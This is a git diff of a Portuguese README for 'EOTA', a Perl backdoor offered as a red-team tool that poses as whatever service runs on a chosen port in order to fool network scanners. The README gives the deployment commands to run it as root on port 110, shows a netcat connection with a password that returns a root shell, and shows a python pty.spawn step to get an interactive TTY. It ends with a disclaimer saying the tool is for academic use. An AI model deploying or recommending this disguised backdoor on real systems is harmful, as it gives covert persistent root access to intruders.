@@ -1,6 +1,6 @@
 # EOTA
-Este script é uma backdoor ''' Perl ''' projetada para equipes vermelhas e que funciona como um serviço/porta qualquer que voce desejar.
-A backdoor informar qualquer programa de mapeamento de rede que ele é um serviço determinado pelo orquestrador da ferramenta.
+Este script é uma backdoor ''' Perl ''' projetada para equipes vermelhas e que funciona como um serviço/porta qualquer que voce desejar.<br/>
+A backdoor informar qualquer programa de mapeamento de rede que ele é um serviço determinado pelo orquestrador da ferramenta.<br/>
 Por favor modifique o codigo fonte da ferramenta para personalização.
 
 #### obs: Necessario modificação para implementar criptografia no trafego.
@@ -23,14 +23,18 @@ Para executar EOTA voce precisará de acesso root ao sistema, depois execute os 
 >$ git clone https://github.com/Outs1d3r-Net/PERL.git<br/>
 >$ cd PERL
 >$ chmod a+x EOTA.pl
->$ perl ./EOTA.pl 110 & 2>&1
+># perl ./EOTA.pl 110 & 2>&1
 
 ## CONECTANDO
->$ nc IP_alvo 110
->PASSWORD
->id
+>$ nc IP_alvo 110<br/>
+>PASSWORD<br/>
+>id<br/>
+>uid=0(root) gid=0(root) groups=0(root)
 
 ## TTY
 Se voce precisar de um TTY voce verificar com o python por exemplo para obter uma linha de comando mais interativa:<br/>
 >which python<br/>
 >/usr/bin/python2 -c 'import pty;pty.spawn("/bin/bash")'<br/>
+
+
+#### ATENÇÃO: Não me responsabilizo pelo uso indevido desta ferramenta, ela foi projetada para fins academicos. 
